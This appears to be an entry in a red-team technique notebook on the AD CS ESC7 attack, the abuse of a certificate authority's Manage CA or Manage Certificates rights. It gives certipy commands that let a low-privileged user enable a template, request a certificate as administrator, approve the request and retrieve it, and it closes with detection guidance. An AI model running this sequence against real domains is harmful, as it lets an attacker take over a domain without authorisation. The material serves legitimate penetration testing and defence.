---
id: adcs_esc7
type: technique
label: "AD CS ESC7 (CA management rights)"
phase: "privesc"
tools: ["certipy", "certify"]
cve: null
detect: "Review CA Manage CA/Manage Certificates assignments and audit administrative, approval and issuance-state changes."
mitre: "T1649"
tag: null
---


# AD CS ESC7 (CA management rights)

### Affected object / attribute
**CA object roles** — **Manage CA** / **Manage Certificates**.

### Concept (deep)
A low-priv principal holds a CA management role → approve own pending requests or issue arbitrary certificates. With **Manage CA**, enable the ESC6 flag and chain.

### Commands
```bash
# ── Enable a template (Manage CA) ───────────────────────────────────
certipy ca -u lowpriv@corp.local -p 'Password123!' \
  -ca CORP-CA -enable-template Vuln

# ── Request a pending certificate ────────────────────────────────────
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca CORP-CA -template Vuln -upn administrator@corp.local

# ── Issue the pending request ────────────────────────────────────────
certipy ca -u lowpriv@corp.local -p 'Password123!' \
  -ca CORP-CA -issue-request <id>

# ── Retrieve the certificate ─────────────────────────────────────────
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca CORP-CA -retrieve <id>
```

### Detection
**4887** (cert issued) by a non-CA-officer; CA role changes. `Manage CA` should be **EA-only**.

---
